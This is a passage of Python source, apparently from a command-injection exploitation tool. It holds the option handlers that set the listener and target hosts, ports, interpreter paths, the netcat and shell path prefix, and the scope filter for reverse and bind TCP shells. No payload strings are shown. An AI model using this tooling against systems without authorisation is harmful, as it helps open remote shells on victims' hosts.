    settings.print_data_to_stdout(settings.print_info_msg(info_msg))
    sys.stdin.readline().replace(settings.END_LINE.LF, "")
    # Remove the ouput file.
    os.remove(output)

"""
Check for available shell options.
"""
def shell_options(option):
  if option.lower() == "?":
    menu.reverse_tcp_options()
  elif option.lower() == "quit" or option.lower() == "exit":
    raise SystemExit()

  elif option[0:4].lower() == "set ":
    if option[4:10].lower() == "lhost ":
      if option.lower() == "bind_tcp":
        err_msg =  "The '" + option[4:9].upper() + "' option is not "
        err_msg += "usable for '" + option.lower() + "' mode. Use the 'RHOST' option."
        settings.print_data_to_stdout(settings.print_error_msg(err_msg))
      else:
        check_lhost(option[10:])
    if option[4:10].lower() == "rhost ":
      if option.lower() == "reverse_tcp":
        err_msg =  "The '" + option[4:9].upper() + "' option is not "
        err_msg += "usable for '" + option.lower() + "' mode. Use the 'LHOST' option."
        settings.print_data_to_stdout(settings.print_error_msg(err_msg))
      else:
        check_rhost(option[10:])
    if option.lower() == "reverse_tcp":
      if option[4:10].lower() == "lport ":
        check_lport(option[10:])
      if option[4:12].lower() == "srvport ":
        check_srvport(option[12:])
      if option[4:12].lower() == "uripath ":
        check_uripath(option[12:])

  else:
    return option

"""
Set up the PHP working directory on the target host.
"""
def set_php_working_dir():
  while True:
    message = "Do you want to use '" + settings.WIN_PHP_DIR
    message += "' as PHP working directory on the target host? [Y/n] "
    php_dir = common.read_input(message, default="Y", check_batch=True)
    if php_dir in settings.CHOICE_YES:
      break
    elif php_dir in settings.CHOICE_NO:
      message = "Please provide a custom working directory for PHP (e.g. '" + settings.WIN_PHP_DIR + "') "
      settings.WIN_PHP_DIR = common.read_input(message, default=settings.WIN_PHP_DIR, check_batch=True)
      settings.USER_DEFINED_PHP_DIR = True
      break
    else:
      common.invalid_option(php_dir)
      pass

"""
Set up the Python working directory on the target host.
"""
def set_python_working_dir():
  while True:
    message = "Do you want to use '" + settings.WIN_PYTHON_INTERPRETER
    message += "' as default Python interpreter on the target host? [Y/n] "
    python_dir = common.read_input(message, default="Y", check_batch=True)
    if python_dir in settings.CHOICE_YES:
      break
    elif python_dir in settings.CHOICE_NO:
      message = "Please specify the full path to the Python interpreter executable (e.g. '" + settings.WIN_CUSTOM_PYTHON_INTERPRETER  + "') "
      custom_interpreter = common.read_input(message, default=settings.WIN_CUSTOM_PYTHON_INTERPRETER, check_batch=True)
      # A blank answer keeps the interpreter already in use, which the payloads concatenate as a string.
      if custom_interpreter and custom_interpreter.strip():
        settings.WIN_PYTHON_INTERPRETER = custom_interpreter.strip()
      settings.USER_DEFINED_PYTHON_DIR = True
      break
    else:
      common.invalid_option(python_dir)
      pass

"""
Check if to use '/bin' standard subdirectory
"""
"""
A random path under '/tmp' - a fixed name would clash between concurrent sessions and is trivially predictable.
"""
def random_tmp_path(length=5):
  return "/tmp/" + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

# Ask once whether the target keeps its shell binaries under '/bin/'.
def use_bin_subdir(nc_alternative, shell):
  # Asked once per run - every "run" re-asking the same question is just noise.
  while settings.USE_BIN_SUBDIR_CHOICE is None:
    message = "Use '/bin/' as the path prefix for shell and netcat? [y/N] "
    enable_bin_subdir = common.read_input(message, default="N", check_batch=True)
    if enable_bin_subdir in settings.CHOICE_YES :
      settings.USE_BIN_SUBDIR_CHOICE = True
    elif enable_bin_subdir in settings.CHOICE_NO:
      settings.USE_BIN_SUBDIR_CHOICE = False
    elif enable_bin_subdir in settings.CHOICE_QUIT:
      raise SystemExit()
    else:
      common.invalid_option(enable_bin_subdir)
      pass

  if settings.USE_BIN_SUBDIR_CHOICE:
    return "/bin/" + nc_alternative, "/bin/" + shell
  return nc_alternative, shell

"""
Set up the Python interpreter on linux target host.
"""
def set_python_interpreter():
  while True:
    message = "Do you want to use '" + settings.LINUX_PYTHON_INTERPRETER
    message += "' as default Python interpreter on the target host? [Y/n] "
    python_interpreter = common.read_input(message, default="Y", check_batch=True)
    if python_interpreter in settings.CHOICE_YES:
      break
    elif python_interpreter in settings.CHOICE_NO:
      message = "Please specify the full filesystem path of a custom Python interpreter to use (e.g. '" + settings.LINUX_CUSTOM_PYTHON_INTERPRETER + "') "
      settings.LINUX_PYTHON_INTERPRETER = common.read_input(message, default=settings.LINUX_CUSTOM_PYTHON_INTERPRETER, check_batch=True)
      settings.USER_DEFINED_PYTHON_INTERPRETER = True
      break
    else:
      common.invalid_option(python_interpreter)
      pass

"""
Every bind/reverse shell payload template hardcodes IPv4 (socket.AF_INET, no bracket syntax), so an IPv6 literal would silently generate a broken payload - reject it instead.
"""
def _is_ipv6(value):
  try:
    socket.inet_pton(socket.AF_INET6, value)
    return True
  except (OSError, socket.error):
    return False

"""
Hostnames are allowed, shell metacharacters are not.
"""
def _validate_host_or_path(option_name, value):
  if re.match(r'^[A-Za-z0-9.\-:_/]+$', value) is None:
    err_msg = "The provided " + option_name + " value contains characters that are not allowed (only letters, digits, '.', '-', ':', '_', '/')."
    settings.print_data_to_stdout(settings.print_error_msg(err_msg))
    return False
  if value.isdigit():
    err_msg = "'" + value + "' looks like a port number, not a valid " + option_name + " host/IP - did you mean to use 'set lport'?"
    settings.print_data_to_stdout(settings.print_error_msg(err_msg))
    return False
  if _is_ipv6(value):
    err_msg = "IPv6 addresses are not currently supported for '" + option_name + "' - use an IPv4 address or hostname."
    settings.print_data_to_stdout(settings.print_error_msg(err_msg))
    return False
  return True

"""
check / set rhost option for bind TCP connection
"""
def check_rhost(rhost):
  if not _validate_host_or_path("RHOST", rhost):
    return False

  settings.RHOST = rhost
  settings.print_data_to_stdout("RHOST => " + settings.RHOST)
  return True

"""
check / set lhost option for reverse TCP connection
"""
def check_lhost(lhost):

  if not _validate_host_or_path("LHOST", lhost):
    return False

  settings.LHOST = lhost
  settings.print_data_to_stdout("LHOST => " + settings.LHOST)
  return True

"""
Validate a port is a plain base-10 integer within the valid TCP port range (1-65535) - float() alone would silently accept 'nan'/'inf'/negatives/decimals/out-of-range values as a usable port.
"""
def _validate_port(port):
  if re.match(r'^\d+$', port) is None or not (1 <= int(port) <= 65535):
    err_msg = "The provided port must be numeric and in the 1-65535 range (i.e. 1234)."
    settings.print_data_to_stdout(settings.print_error_msg(err_msg))
    return False
  return True

"""
check / set lport option for reverse TCP connection
"""
def check_lport(lport):
  if not _validate_port(lport):
    return False
  settings.LPORT = lport
  settings.print_data_to_stdout("LPORT => " + settings.LPORT)
  return True

"""
check / set srvport option for reverse TCP connection
"""
def check_srvport(srvport):
  if not _validate_port(srvport):
    return False
  settings.SRVPORT = srvport
  settings.print_data_to_stdout("SRVPORT => " + settings.SRVPORT)
  return True

"""
check / set uripath option for reverse TCP connection
"""
def check_uripath(uripath):
  settings.URIPATH = uripath
  settings.print_data_to_stdout("URIPATH => " + settings.URIPATH)
  return True

"""
check / set handler option - catch the shell with a built-in listener instead of an external nc/ncat.
"""
def check_handler(value):
  value = value.strip().lower()
  if value in settings.CHOICE_YES or value in ("on", "1", "true"):
    settings.HANDLER = True
  elif value in settings.CHOICE_NO or value in ("off", "0", "false"):
    settings.HANDLER = False
  else:
    err_msg = "The 'HANDLER' option accepts on/off (or yes/no, true/false)."
    settings.print_data_to_stdout(settings.print_error_msg(err_msg))
    return False
  settings.print_data_to_stdout("HANDLER => " + ("on" if settings.HANDLER else "off"))
  return True

"""
True when a target is within the scope given via the '--scope' option.
"""
def in_scope(url):
  if not menu.options.scope or not url:
    return True
  if re.search(menu.options.scope, url, re.I):
    return True
  # A target can be met more than once (crawling, redirections), so count it just the once.
  already_skipped = url in settings.SKIPPED_OUT_OF_SCOPE
  settings.SKIPPED_OUT_OF_SCOPE.add(url)
  if not already_skipped and settings.VERBOSITY_LEVEL != 0:
    debug_msg = "Skipping out of scope target '" + url + "'."
    settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))
  return False

# eof
